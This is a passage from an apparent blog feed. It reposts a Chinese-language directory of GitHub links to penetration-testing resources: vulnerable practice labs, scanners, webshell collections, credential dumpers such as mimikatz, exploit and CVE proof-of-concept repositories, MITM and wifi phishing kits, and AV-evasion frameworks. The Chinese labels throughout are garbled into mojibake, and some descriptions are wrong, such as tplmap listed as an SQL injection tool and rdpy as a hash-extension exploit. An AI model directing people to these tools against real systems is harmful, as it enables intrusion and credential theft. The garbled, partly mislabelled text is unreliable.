<h1 id="æ¼æ´åŠæ¸—é€ç»ƒä¹ å¹³å°"><a href="#æ¼æ´åŠæ¸—é€ç»ƒä¹ å¹³å°" class="headerlink" title="æ¼æ´åŠæ¸—é€ç»ƒä¹ å¹³å°"></a>æ¼æ´åŠæ¸—é€ç»ƒä¹ å¹³å°</h1><p>WebGoatæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwaæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>æ•°æ®åº“æ³¨å…¥ç»ƒä¹ å¹³å° ï¼š<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goatï¼š<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Rubyç¼–å†™çš„ä¸€æ¬¾å·¥å…·ï¼Œå®‰å…¨æ–¹æ¡ˆç”Ÿæˆå™¨ï¼ˆSecGenï¼‰ï¼š<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulAppsæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Webçªç ´æ¼”ç»ƒå¹³å°ï¼š<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoatæ—§ç‰ˆï¼š<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
]]></content>
      <categories>
        <category>å·¥å…·æ‰‹å†Œ</category>
      </categories>
      <tags>
        <tag>å·¥å…·æ‰‹å†Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>githubæ¸—é€æµ‹è¯•å·¥å…·é›†-è½¬</title>
    <url>/posts/a25c6c18/</url>
    <content><![CDATA[<p>è½¬è‡ª: <a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect</a></p>
<h1 id="æ¼æ´ç»ƒä¹ å¹³å°"><a href="#æ¼æ´ç»ƒä¹ å¹³å°" class="headerlink" title="æ¼æ´ç»ƒä¹ å¹³å°"></a>æ¼æ´ç»ƒä¹ å¹³å°</h1><p>WebGoatæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br>webgoat-legacyæ¼æ´ç»ƒä¹ å¹³å°:<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a><br>zvuldirllæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>vulappsæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>dvwaæ¼æ´ç»ƒä¹ å¹³å°ï¼š<br><a href="https://github.com/RandomStorm/DVWA">https://github.com/RandomStorm/DVWA</a><br>æ•°æ®åº“æ³¨å…¥ç»ƒä¹ å¹³å° ï¼š<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>ç”¨nodeç¼–å†™çš„æ¼æ´ç»ƒä¹ å¹³å°ï¼Œlike OWASP NodeGoatï¼š<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Rubyç¼–å†™çš„ä¸€æ¬¾å·¥å…·ï¼Œç”Ÿæˆå«æ¼æ´çš„è™šæ‹Ÿæœºï¼š<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a></p>
<h1 id="èŠ±å¼æ‰«æå™¨"><a href="#èŠ±å¼æ‰«æå™¨" class="headerlink" title="èŠ±å¼æ‰«æå™¨"></a>èŠ±å¼æ‰«æå™¨</h1><p>Nmapç«¯å£æ‰«æå™¨ï¼š<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>æœ¬åœ°ç½‘ç»œæ‰«æå™¨ï¼š<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>å­åŸŸåæ‰«æå™¨ï¼š<br><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>linuxæ¼æ´æ‰«æï¼š<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>åŸºäºç«¯å£æ‰«æä»¥åŠå…³è”CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>æ¼æ´è·¯ç”±æ‰«æå™¨ï¼š<br><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a><br>è¿·ä½ æ‰¹é‡ä¿¡æ¯æ³„æ¼æ‰«æè„šæœ¬ï¼š<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>Wafç±»å‹æ£€æµ‹å·¥å…·ï¼š<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>æœåŠ¡å™¨ç«¯å£å¼±å£ä»¤æ‰«æå™¨ï¼š<br><a href="https://github.com/wilson9x1/fenghuangscanner_v3">https://github.com/wilson9x1/fenghuangscanner_v3</a><br>Fox-scanæ‰«æå™¨ï¼š<br><a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a><br>ä¿¡æ¯æœé›†å·¥å…·</p>
<h1 id="ç¤¾å·¥æ”¶é›†å™¨ï¼š"><a href="#ç¤¾å·¥æ”¶é›†å™¨ï¼š" class="headerlink" title="ç¤¾å·¥æ”¶é›†å™¨ï¼š"></a>ç¤¾å·¥æ”¶é›†å™¨ï¼š</h1><p><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>Githubä¿¡æ¯æœé›†ï¼š<br><a href="https://github.com/sea-god/gitscan">https://github.com/sea-god/gitscan</a><br>github Repoä¿¡æ¯æœé›†å·¥å…·ï¼š<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a><br>ä¿¡æ¯æ¢æµ‹åŠæ‰«æå·¥å…·ï¼š<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>å†…éƒ¨ç½‘ç»œä¿¡æ¯æ‰«æå™¨ï¼š<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>è¿œç¨‹æ¡Œé¢ç™»å½•æ‰«æå™¨ï¼š<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>ç½‘ç»œåŸºç¡€è®¾æ–½æ¸—é€å·¥å…·<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>SNMAPå¯†ç ç ´è§£:<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>webshellå¤§åˆé›†ï¼š<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>æ¸—é€ä»¥åŠwebæ”»å‡»è„šæœ¬ï¼š<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>webæ¸—é€å°å·¥å…·å¤§åˆé›†ï¼š<br><a href="https://github.com/rootphantomer/hacktoolsfor_me">https://github.com/rootphantomer/hacktoolsfor_me</a><br>XSSæ•°æ®æ¥æ”¶å¹³å°ï¼š<br><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a><br>XSSä¸CSRFå·¥å…·ï¼š<br><a href="https://github.com/evilcos/xssor">https://github.com/evilcos/xssor</a><br>xsså¤šåŠŸèƒ½æ‰«æå™¨ï¼š<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>webæ¼æ´æ‰«æå™¨:<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>WEBæ¼æ´æ‰«æå™¨ï¼š<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>æ¸—é€å¸¸ç”¨å°å·¥å…·åŒ…ï¼š<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>webç›®å½•æ‰«æå™¨:<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>webå‘å‘½ä»¤æ³¨å…¥æ£€æµ‹å·¥å…·ï¼š<br><a href="https://github.com/stasinopoulos/commix">https://github.com/stasinopoulos/commix</a><br>è‡ªåŠ¨åŒ–SQLæ³¨å…¥æ£€æŸ¥å·¥å…·ï¼š<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>SSLæ‰«æå™¨ï¼š<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>å®‰å…¨å·¥å…·é›†åˆï¼š<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>apacheæ—¥å¿—åˆ†æå™¨ï¼š<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>phpä»£ç å®¡è®¡å·¥å…·ï¼š<br><a href="https://github.com/pwnsdx/BadCode">https://github.com/pwnsdx/BadCode</a><br>webæŒ‡çº¹è¯†åˆ«æ‰«æï¼š<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>æ£€æŸ¥ç½‘ç«™æ¶æ„æ”»å‡»ï¼š<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>wordpreesæ¼æ´æ‰«æå™¨ï¼š<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>å›ºä»¶æ¼æ´æ‰«æå™¨ï¼š<br><a href="https://github.com/misterch0c/firminator_backend">https://github.com/misterch0c/firminator_backend</a><br>æ•°æ®åº“æ³¨å…¥å·¥å…·<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>Webä»£ç†ï¼š<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>æ–°ç‰ˆä¸­å›½èœåˆ€ï¼š<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a><br>gitæ³„éœ²åˆ©ç”¨EXPï¼š<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>æµè§ˆå™¨æ”»å‡»æ¡†æ¶ï¼š<br><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a><br>è‡ªåŠ¨åŒ–ç»•è¿‡WAFè„šæœ¬ï¼š<br><a href="https://github.com/khalilbijjou/WAFNinja">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser">https://github.com/owtf/wafbypasser</a><br>ä¸€æ¬¾å¼€æºWAFï¼š<br><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a><br>httpå‘½ä»¤è¡Œå®¢æˆ·ç«¯ï¼š<br><a href="https://github.com/jkbrzt/httpie">https://github.com/jkbrzt/httpie</a><br>æµè§ˆå™¨è°ƒè¯•åˆ©å™¨ï¼š<br><a href="https://github.com/firebug/firebug">https://github.com/firebug/firebug</a><br>DISCUZæ¼æ´æ‰«æå™¨ï¼š<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a><br>è‡ªåŠ¨åŒ–ä»£ç å®¡è®¡å·¥å…·<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a><br>æµè§ˆå™¨æ”»å‡»æ¡†æ¶ï¼š<br><a href="https://github.com/julienbedard/browsersploit">https://github.com/julienbedard/browsersploit</a><br>tomcatè‡ªåŠ¨åé—¨éƒ¨ç½²ï¼š<br><a href="https://github.com/mgeeky/tomcatWarDeployer">https://github.com/mgeeky/tomcatWarDeployer</a><br>ç½‘ç»œç©ºé—´æŒ‡çº¹æ‰«æå™¨ï¼š<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a><br>burpsuitä¹‹J2EEæ‰«ææ’ä»¶ï¼š<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a></p>
<h1 id="windowsåŸŸæ¸—é€å·¥å…·"><a href="#windowsåŸŸæ¸—é€å·¥å…·" class="headerlink" title="windowsåŸŸæ¸—é€å·¥å…·"></a>windowsåŸŸæ¸—é€å·¥å…·</h1><p>mimikatzæ˜æ–‡æ³¨å…¥ï¼š<br><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br>Powershellæ¸—é€åº“åˆé›†ï¼š<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>Powershell toolsåˆé›†ï¼š<br><a href="https://github.com/clymb3r/PowerShell">https://github.com/clymb3r/PowerShell</a><br>powershellçš„mimikittenz:<br><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a><br>åŸŸæ¸—é€æ•™ç¨‹:<br><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p>
<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Webå‘Fuzzå·¥å…·<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>HTTPæš´åŠ›ç ´è§£ï¼Œæ’åº“æ”»å‡»è„šæœ¬<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></p>
<h1 id="æ¼æ´åˆ©ç”¨åŠæ”»å‡»æ¡†æ¶"><a href="#æ¼æ´åˆ©ç”¨åŠæ”»å‡»æ¡†æ¶" class="headerlink" title="æ¼æ´åˆ©ç”¨åŠæ”»å‡»æ¡†æ¶"></a>æ¼æ´åˆ©ç”¨åŠæ”»å‡»æ¡†æ¶</h1><p>msfæ¡†æ¶ï¼š<br><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a><br>pocsscanæ”»å‡»æ¡†æ¶ï¼š<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a><br>Pocsuiteæ”»å‡»æ¡†æ¶:<br><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a><br>Beebeetoæ”»å‡»æ¡†æ¶ï¼š<br><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a><br>æ¼æ´POC&amp;EXP:<br>ExploitDBå®˜æ–¹gitç‰ˆæœ¬:<br><a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a><br>phpæ¼æ´ä»£ç åˆ†æï¼š<br><a href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a><br>CVE-2016-2107:<br><a href="https://github.com/FiloSottile/CVE-2016-2107">https://github.com/FiloSottile/CVE-2016-2107</a><br>CVE-2015-7547 POCï¼š<br><a href="https://github.com/fjserna/CVE-2015-7547">https://github.com/fjserna/CVE-2015-7547</a><br>JAVAååºåˆ—åŒ–POCç”Ÿæˆå·¥å…·:<br><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br>JAVAååºåˆ—åŒ–EXP:<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits">https://github.com/foxglovesec/JavaUnserializeExploits</a><br>Jenkins CommonCollections EXP:<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit">https://github.com/CaledoniaProject/jenkins-cli-exploit</a><br>CVE-2015-2426 EXP (windowså†…æ ¸ææƒ):<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a><br>use docker to show web attack(phpæœ¬åœ°æ–‡ä»¶åŒ…å«ç»“åˆphpinfo<br>getshell ä»¥åŠssrfç»“åˆcurlçš„åˆ©ç”¨æ¼”ç¤º):<br><a href="https://github.com/hxer/vulnapp">https://github.com/hxer/vulnapp</a><br>php7ç¼“å­˜è¦†å†™æ¼æ´DemoåŠç›¸å…³å·¥å…·:<br><a href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a><br>XcodeGhostæœ¨é©¬æ ·æœ¬:<br><a href="https://github.com/XcodeGhostSource/XcodeGhost">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
<h1 id="ä¸­é—´äººæ”»å‡»åŠé’“é±¼"><a href="#ä¸­é—´äººæ”»å‡»åŠé’“é±¼" class="headerlink" title="ä¸­é—´äººæ”»å‡»åŠé’“é±¼"></a>ä¸­é—´äººæ”»å‡»åŠé’“é±¼</h1><p>ä¸­é—´äººæ”»å‡»æ¡†æ¶:<br><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a><br>Inject code, jam wifi, and spy on wifi users:<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a><br>ä¸­é—´äººä»£ç†å·¥å…·:<br><a href="https://github.com/intrepidusgroup/mallory">https://github.com/intrepidusgroup/mallory</a><br>wifié’“é±¼:<br><a href="https://github.com/sophron/wifiphisher">https://github.com/sophron/wifiphisher</a></p>
<h1 id="å¯†ç ç ´è§£"><a href="#å¯†ç ç ´è§£" class="headerlink" title="å¯†ç ç ´è§£"></a>å¯†ç ç ´è§£</h1><p>å¯†ç ç ´è§£å·¥å…·:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>æœ¬åœ°å­˜å‚¨çš„å„ç±»å¯†ç æå–åˆ©å™¨:<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
<h1 id="äºŒè¿›åˆ¶åŠä»£ç åˆ†æå·¥å…·"><a href="#äºŒè¿›åˆ¶åŠä»£ç åˆ†æå·¥å…·" class="headerlink" title="äºŒè¿›åˆ¶åŠä»£ç åˆ†æå·¥å…·"></a>äºŒè¿›åˆ¶åŠä»£ç åˆ†æå·¥å…·</h1><p>äºŒè¿›åˆ¶åˆ†æå·¥å…·<br><a href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a><br>ç³»ç»Ÿæ‰«æå™¨<br><a href="https://github.com/quarkslab/binmap">https://github.com/quarkslab/binmap</a><br>rp:<br><a href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a><br>Windows Exploit Developmentå·¥å…·<br><a href="https://github.com/lillypad/badger">https://github.com/lillypad/badger</a><br>äºŒè¿›åˆ¶é™æ€åˆ†æå·¥å…·ï¼ˆpythonï¼‰:<br><a href="https://github.com/bdcht/amoco">https://github.com/bdcht/amoco</a><br>Python Exploit Development Assistance for GDB:<br><a href="https://github.com/longld/peda">https://github.com/longld/peda</a><br>å¯¹BillGates Linux Botnetç³»æœ¨é©¬æ´»åŠ¨çš„ç›‘æ§å·¥å…·<br><a href="https://github.com/ValdikSS/billgates-botnet-tracker">https://github.com/ValdikSS/billgates-botnet-tracker</a><br>æœ¨é©¬é…ç½®å‚æ•°æå–å·¥å…·:<br><a href="https://github.com/kevthehermit/RATDecoders">https://github.com/kevthehermit/RATDecoders</a><br>Shellphishç¼–å†™çš„äºŒè¿›åˆ¶åˆ†æå·¥å…·ï¼ˆCTFå‘ï¼‰:<br><a href="https://github.com/angr/angr">https://github.com/angr/angr</a><br>é’ˆå¯¹pythonçš„é™æ€ä»£ç åˆ†æå·¥å…·:<br><a href="https://github.com/yinwang0/pysonar2">https://github.com/yinwang0/pysonar2</a><br>ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„è„šæœ¬ï¼ˆshellï¼‰åˆ†æå·¥å…·ï¼Œç”¨æ¥ç»™å‡ºè­¦å‘Šå’Œå»ºè®®:<br><a href="https://github.com/koalaman/shellcheck">https://github.com/koalaman/shellcheck</a><br>åŸºäºASTå˜æ¢çš„ç®€æ˜“Javascriptåæ··æ·†è¾…åŠ©å·¥å…·:<br><a href="https://github.com/ChiChou/etacsufbo">https://github.com/ChiChou/etacsufbo</a></p>
<h1 id="EXPç¼–å†™æ¡†æ¶åŠå·¥å…·"><a href="#EXPç¼–å†™æ¡†æ¶åŠå·¥å…·" class="headerlink" title="EXPç¼–å†™æ¡†æ¶åŠå·¥å…·"></a>EXPç¼–å†™æ¡†æ¶åŠå·¥å…·</h1><p>äºŒè¿›åˆ¶EXPç¼–å†™å·¥å…·:<br><a href="https://github.com/t00sh/rop-tool">https://github.com/t00sh/rop-tool</a><br>CTF Pwn ç±»é¢˜ç›®è„šæœ¬ç¼–å†™æ¡†æ¶:<br><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a><br>an easy-to-use io library for pwning development:<br><a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a><br>è·¨å¹³å°æ³¨å…¥å·¥å…·:<br><a href="https://github.com/frida/frida">https://github.com/frida/frida</a><br>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»EXPï¼š<br><a href="https://github.com/citronneur/rdpy">https://github.com/citronneur/rdpy</a></p>
<h1 id="éšå†™"><a href="#éšå†™" class="headerlink" title="éšå†™"></a>éšå†™</h1><p>éšå†™æ£€æµ‹å·¥å…·<br><a href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a></p>
<h1 id="å„ç±»å®‰å…¨èµ„æ–™"><a href="#å„ç±»å®‰å…¨èµ„æ–™" class="headerlink" title="å„ç±»å®‰å…¨èµ„æ–™:"></a>å„ç±»å®‰å…¨èµ„æ–™:</h1><p>data_hackingåˆé›†:<br><a href="https://github.com/ClickSecurity/data_hacking">https://github.com/ClickSecurity/data_hacking</a><br>mobile-security-wiki:<br><a href="https://github.com/exploitprotocol/mobile-security-wiki">https://github.com/exploitprotocol/mobile-security-wiki</a><br>ä¹¦ç±ã€Šreverse-engineering-for-beginnersã€‹:<br><a href="https://github.com/veficos/reverse-engineering-for-beginners">https://github.com/veficos/reverse-engineering-for-beginners</a><br>ä¸€äº›ä¿¡æ¯å®‰å…¨æ ‡å‡†åŠè®¾å¤‡é…ç½®:<br><a href="https://github.com/luyg24/IT_security">https://github.com/luyg24/IT_security</a><br>APTç›¸å…³ç¬”è®°:<br><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a><br>Kconèµ„æ–™:<br><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a><br>ã€ŠDO NOT FUCK WITH A HACKERã€‹:<br><a href="https://github.com/citypw/DNFWAH">https://github.com/citypw/DNFWAH</a><br>å„ç±»å®‰å…¨è„‘æ´å›¾ï¼š<br><a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a><br>ä¿¡æ¯å®‰å…¨æµç¨‹å›¾ï¼š<br><a href="https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428">https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p>
<h1 id="å„ç±»CTFèµ„æº"><a href="#å„ç±»CTFèµ„æº" class="headerlink" title="å„ç±»CTFèµ„æº"></a>å„ç±»CTFèµ„æº</h1><p>è¿‘å¹´ctf writeupå¤§å…¨:<br><a href="https://github.com/ctfs/write-ups-2016">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014">https://github.com/ctfs/write-ups-2014</a><br>fbctfç«èµ›å¹³å°Demo:<br><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a><br>ctf Resources:<br><a href="https://github.com/ctfs/resources">https://github.com/ctfs/resources</a><br>ctfåŠé»‘å®¢èµ„æºåˆé›†:<br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a><br>ctfå’Œå®‰å…¨å·¥å…·å¤§åˆé›†:<br><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a><br>ctfå‘ pythonå·¥å…·åŒ…<br><a href="https://github.com/P1kachu/v0lt">https://github.com/P1kachu/v0lt</a></p>
<h1 id="å„ç±»ç¼–ç¨‹èµ„æº"><a href="#å„ç±»ç¼–ç¨‹èµ„æº" class="headerlink" title="å„ç±»ç¼–ç¨‹èµ„æº"></a>å„ç±»ç¼–ç¨‹èµ„æº</h1><p> å¤§ç¤¼åŒ…ï¼ˆä»€ä¹ˆéƒ½æœ‰ï¼‰:<br><a href="https://github.com/bayandin/awesome-awesomeness">https://github.com/bayandin/awesome-awesomeness</a><br>bash-handbook:<br><a href="https://github.com/denysdovhan/bash-handbook">https://github.com/denysdovhan/bash-handbook</a><br>pythonèµ„æºå¤§å…¨:<br><a href="https://github.com/jobbole/awesome-python-cn">https://github.com/jobbole/awesome-python-cn</a><br>gitå­¦ä¹ èµ„æ–™:<br><a href="https://github.com/xirong/my-git">https://github.com/xirong/my-git</a><br>å®‰å“å¼€æºä»£ç è§£æ<br><a href="https://github.com/android-cn/android-open-project">https://github.com/android-cn/android-open-project</a><br>pythonæ¡†æ¶ï¼Œåº“ï¼Œèµ„æºå¤§åˆé›†:<br><a href="https://github.com/vinta/awesome-python">https://github.com/vinta/awesome-python</a><br>JS æ­£åˆ™è¡¨è¾¾å¼åº“ï¼ˆç”¨äºç®€åŒ–æ„é€ å¤æ‚çš„JSæ­£åˆ™è¡¨è¾¾å¼ï¼‰:<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p>
<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>python æ­£åˆ™è¡¨è¾¾å¼åº“ï¼ˆç”¨äºç®€åŒ–æ„é€ å¤æ‚çš„pythonæ­£åˆ™è¡¨è¾¾å¼ï¼‰:<br><a href="https://github.com/VerbalExpressions/">https://github.com/VerbalExpressions/</a><br>pythonä»»åŠ¡ç®¡ç†ä»¥åŠå‘½ä»¤æ‰§è¡Œåº“:<br><a href="https://github.com/pyinvoke/invoke">https://github.com/pyinvoke/invoke</a><br>python exeæ‰“åŒ…åº“:<br><a href="https://github.com/pyinstaller/pyinstaller">https://github.com/pyinstaller/pyinstaller</a><br>Veil-Evasionå…æ€é¡¹ç›®ï¼š<br><a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a><br>py3 çˆ¬è™«æ¡†æ¶:<br><a href="https://github.com/orf/cyborg">https://github.com/orf/cyborg</a><br>ä¸€ä¸ªæä¾›åº•å±‚æ¥å£æ•°æ®åŒ…ç¼–ç¨‹å’Œç½‘ç»œåè®®æ”¯æŒçš„pythonåº“:<br><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a><br>python requests åº“:<br><a href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a><br>python å®ç”¨å·¥å…·åˆé›†:<br><a href="https://github.com/mahmoud/boltons">https://github.com/mahmoud/boltons</a><br>pythonçˆ¬è™«ç³»ç»Ÿ:<br><a href="https://github.com/binux/pyspider">https://github.com/binux/pyspider</a></p>
<h1 id="ç¦åˆ©"><a href="#ç¦åˆ©" class="headerlink" title="ç¦åˆ©"></a>ç¦åˆ©</h1><p>å¾®ä¿¡è‡ªåŠ¨æŠ¢çº¢åŒ…åŠ¨æ€åº“<br><a href="https://github.com/east520/AutoGetRedEnv">https://github.com/east520/AutoGetRedEnv</a><br>å¾®ä¿¡æŠ¢çº¢åŒ…æ’ä»¶ï¼ˆå®‰å“ç‰ˆï¼‰<br><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a><br>hardsedç¥å™¨:<br><a href="https://github.com/yangyangwithgnu/hardseed">https://github.com/yangyangwithgnu/hardseed</a></p>
